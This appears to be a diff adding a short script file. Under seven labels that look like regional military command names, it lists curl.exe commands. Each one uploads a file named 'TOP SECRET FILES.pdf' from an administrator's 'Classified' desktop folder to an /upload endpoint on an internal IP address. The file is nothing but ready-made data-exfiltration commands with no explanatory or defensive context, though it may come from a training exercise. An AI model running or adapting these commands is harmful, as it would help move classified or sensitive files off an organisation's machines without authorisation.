@@ -1,0 +1,20 @@
+NCRCOM
+curl.exe -X POST \ -F "file=@c:\Users\Administrator\Desktop\Files\Classified\TOP SECRET FILES.pdf" \ http://10.1.0.80:5000/upload
+
+NOLCOM
+curl.exe -X POST \ -F "file=@c:\Users\Administrator\Desktop\Files\Classified\TOP SECRET FILES.pdf" \ http://10.2.0.81:5000/upload
+
+SOLCOM
+curl.exe -X POST \ -F "file=@c:\Users\Administrator\Desktop\Files\Classified\TOP SECRET FILES.pdf" \ http://10.3.0.82:5000/upload
+
+WESCOM
+curl.exe -X POST \ -F "file=@c:\Users\Administrator\Desktop\Files\Classified\TOP SECRET FILES.pdf" \ http://10.4.0.83:5000/upload
+
+VISCOM
+curl.exe -X POST \ -F "file=@c:\Users\Administrator\Desktop\Files\Classified\TOP SECRET FILES.pdf" \ http://10.5.0.84:5000/upload
+
+EASTMINCOM
+curl.exe -X POST \ -F "file=@c:\Users\Administrator\Desktop\Files\Classified\TOP SECRET FILES.pdf" \ http://10.7.0.85:5000/upload
+
+WESTMINCOM
+curl.exe -X POST \ -F "file=@c:\Users\fileadmin\Desktop\Files\Classified\TOP SECRET FILES.pdf" \ http://10.6.0.86:5000/upload
